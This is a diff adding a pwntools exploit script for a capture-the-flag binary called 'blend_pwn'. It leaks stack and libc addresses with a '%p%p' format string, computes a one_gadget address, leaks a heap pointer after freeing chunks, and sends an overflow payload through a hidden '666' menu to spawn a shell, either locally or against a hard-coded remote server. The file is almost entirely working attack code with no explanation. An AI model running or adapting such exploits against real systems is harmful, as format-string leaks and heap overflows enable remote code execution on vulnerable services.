@@ -1,0 +1,116 @@
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+# Author: i0gan
+# Env: Linux arch 5.8.14-arch1-1
+
+from pwn import *
+import os
+
+r   =  lambda x : io.recv(x)
+ra  =  lambda   : io.recvall()
+rl  =  lambda   : io.recvline(keepends = True)
+ru  =  lambda x : io.recvuntil(x, drop = True)
+s   =  lambda x : io.send(x)
+sl  =  lambda x : io.sendline(x)
+sa  =  lambda x, y : io.sendafter(x, y)
+sla =  lambda x, y : io.sendlineafter(x, y)
+ia  =  lambda : io.interactive()
+c   =  lambda : io.close()
+li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
+
+context.log_level='debug'
+context.terminal = ['tmux', 'splitw', '-h']
+
+elf_path  = 'blend_pwn'
+libc_path = './libc.so.6'
+
+# remote server ip and port
+server_ip = "47.111.96.55"
+server_port = 52704
+
+# if local debug
+LOCAL = 1
+LIBC  = 0
+
+#--------------------------func-----------------------------
+def db():
+	if(LOCAL):
+		gdb.attach(io)
+
+def shu():
+	sla('>', '1')
+	
+def ad(d):
+	sla('>', '2')
+	sla(':', d)
+
+def rm(i):
+	sla('>', '3')
+	sla('>', str(i))
+
+def dp():
+	sla('>', '4')
+
+def gift(d):
+	sla('>', '666')
+	sla('want:', d)
+	
+#--------------------------exploit--------------------------
+def exploit():
+	li('exploit...')
+	sla(':', '%p%p')
+	shu()
+	ru('0x')
+	leak = int(r(12), 16)
+	li('leak: ' + hex(leak))
+	ru('0x')
+	leak = int(r(12), 16)
+	libc_base = leak - 0x3c6780
+	libc_base = leak - 0x39bb20 - 96
+	li('libc_base: ' + hex(libc_base))
+	one_gadget = libc_base + 0x45226
+	one_gadget = libc_base + 0x3f42a
+	dp()
+
+	p = p64(0) * 3
+	p += p64(one_gadget)
+	ad(p)
+	ad('A')
+
+	rm(0)
+	rm(1)
+	#dp()
+	# leak heap
+	ru('\n')
+	heap_leak = u64(ru('\n')[-6:].ljust(8, b'\x00'))
+	li('leak: ' + hex(heap_leak))
+	
+	p = b'A' * 0x20
+	p += p64(heap_leak + 0x20)
+	p += b'A' * 0x9
+	db()
+	gift(p)
+
+def finish():
+	ia()
+	c()
+
+#--------------------------main-----------------------------
+if __name__ == '__main__':
+	
+	if LOCAL:
+		elf = ELF(elf_path)
+		if LIBC:
+			libc = ELF(libc_path)
+			io = elf.process(env = {"LD_PRELOAD":libc_path})
+		else:
+			io = elf.process()
+	
+	else:
+		elf = ELF(elf_path)
+		io = remote(server_ip, server_port)
+		if LIBC:
+			libc = ELF(libc_path)
+
+	exploit()
+	finish()
